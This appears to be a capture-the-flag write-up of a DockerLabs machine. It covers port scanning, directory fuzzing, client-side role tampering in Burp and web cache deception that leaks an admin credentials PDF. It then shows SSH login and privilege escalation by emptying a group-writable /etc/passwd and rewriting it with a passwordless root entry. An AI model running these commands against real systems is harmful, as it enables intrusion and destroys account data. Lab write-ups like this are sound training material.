# IP
172.17.0.2
# Port enumeration
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/intermediate/adopting]
└─$ sudo nmap -p- -sS -sV -sC --min-rate 5000 172.17.0.2
[sudo] password for codebylauti:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 14:22 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.2 (protocol 2.0)
2300/tcp open  cvmmon?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: Origin
|     Access-Control-Allow-Credentials: true
|     X-Cache: BYPASS
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Sat, 23 May 2026 08:59:42 GMT
|     ETag: W/"326-19e540fcc30"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 806
|     Date: Thu, 10 Sep 2026 17:22:30 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="es">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>Adopta un Ping
|     Santuario Ant
|     rtico</title>
|     <link rel="preconnect" href="https://fonts.googleapis.com" />
|     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
|     <link
|     href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:wght@600;700&display=swap"
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     Vary: Origin, Access-Control-Request-Headers
|     Access-Control-Allow-Credentials: true
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Content-Length: 0
|     Date: Thu, 10 Sep 2026 17:22:30 GMT
|     Connection: close
|   RPCCheck:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2300-TCP:V=7.99%I=7%D=9/10%Time=6AA2E756%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,476,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20Origin\r\nAccess-Contr
SF:ol-Allow-Credentials:\x20true\r\nX-Cache:\x20BYPASS\r\nAccept-Ranges:\x
SF:20bytes\r\nCache-Control:\x20public,\x20max-age=0\r\nLast-Modified:\x20
SF:Sat,\x2023\x20May\x202026\x2008:59:42\x20GMT\r\nETag:\x20W/\"326-19e540
SF:fcc30\"\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Leng
SF:th:\x20806\r\nDate:\x20Thu,\x2010\x20Sep\x202026\x2017:22:30\x20GMT\r\n
SF:Connection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"es\">\n
SF:\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\
SF:x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/svg\+xml\"\x20href=\"/
SF:favicon\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20con
SF:tent=\"width=device-width,\x20initial-scale=1\.0\"\x20/>\n\x20\x20\x20\
SF:x20<title>Adopta\x20un\x20Ping\xc3\xbcino\x20\xe2\x80\x94\x20Santuario\
SF:x20Ant\xc3\xa1rtico</title>\n\x20\x20\x20\x20<link\x20rel=\"preconnect\
SF:"\x20href=\"https://fonts\.googleapis\.com\"\x20/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"preconnect\"\x20href=\"https://fonts\.gstatic\.com\"\x20cro
SF:ssorigin\x20/>\n\x20\x20\x20\x20<link\n\x20\x20\x20\x20\x20\x20href=\"h
SF:ttps://fonts\.googleapis\.com/css2\?family=Inter:wght@400;500;600;700&f
SF:amily=Playfair\+Display:wght@600;700&display=swap\"\n\x20\x20\x20\x20\x
SF:20")%r(HTTPOptions,FA,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Or
SF:igin,\x20Access-Control-Request-Headers\r\nAccess-Control-Allow-Credent
SF:ials:\x20true\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,PATCH,PO
SF:ST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2010\x20Sep\x202026
SF:\x2017:22:30\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,FA,
SF:"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Contro
SF:l-Request-Headers\r\nAccess-Control-Allow-Credentials:\x20true\r\nAcces
SF:s-Control-Allow-Methods:\x20GET,HEAD,PUT,PATCH,POST,DELETE\r\nContent-L
SF:ength:\x200\r\nDate:\x20Thu,\x2010\x20Sep\x202026\x2017:22:30\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
MAC Address: C2:E8:36:DD:42:AF (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
```

Two open ports found
- 22 -> SSH
- 2300 -> Web App
# Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/intermediate/adopting]
└─$ gobuster dir -u http://172.17.0.2:2300 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql --exclude-length 806
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:2300
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          806
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,sql,php,html,conf,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 156] [--> /assets/]
products             (Status: 301) [Size: 158] [--> /products/]
static               (Status: 301) [Size: 156] [--> /static/]
Progress: 32291 / 32291 (100.00%)
===============================================================
Finished
===============================================================
```
# Match & Replace
In *Burpsuite* there's an option to enforce client to math and replace the properties we specify.
For instance, we can try to replace *role=user* for *role=admin*

**Original HTTP response**
![[Pasted image 20260910230333.png]]

**Modified HTTP response**
![[Pasted image 20260910230748.png]]

With this tool we can access, other pages in the client. Unfortunately, backend doesn't authorize our user to view further content so it's not a vulnerability.

**New button: Panel de Operaciones (for admins)**
![[Pasted image 20260910231016.png]]

![[Pasted image 20260910231107.png]]

To access http://172.17.0.2:2300/internal/credentials-report.pdf we need admin session/token.
# Cache Deception
Thanks to **Burpsuite** tools we now pdfs are stored in cache

In HTTP response body
```HTTP
X-Cache: HIT
```

If an admin where to enter credential-report.pdf we could easily access once it is stored in cache
We can exploit this vulnerability uploading this link in help center section for admins to visit it

![[Pasted image 20260910231917.png]]
# SSH Login
Thanks to previous exploit we found username and password to login in ssh
*username: pingu*
*password: chocolate*

```sh
ssh pingu@172.17.0.2
```
# Post enumeration
We are in *pinguinos* group
```sh
e11c1556f7d0:~$ id
uid=1001(pingu) gid=101(pinguinos) groups=101(pinguinos),101(pinguinos)
```

We can read and write /cat/passwd
```sh
e11c1556f7d0:~$ ls -l /etc/passwd
-rw-rw-r--    1 root     pinguinos       777 May 23 09:02 /etc/passwd
```

```sh
b4117ff27a2c:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
pingu:x:1001:101::/home/pingu:/bin/sh
```

We should be able to delete root password

```sh
b4117ff27a2c:~$ echo '' > /etc/passwd
b4117ff27a2c:~$ cat /etc/passwd

```

```sh
b4117ff27a2c:~$ echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd
b4117ff27a2c:~$ cat /etc/passwd
root::0:0:root:/root:/bin/sh
```

If su were to exist in this host we could now easily escalate to root user.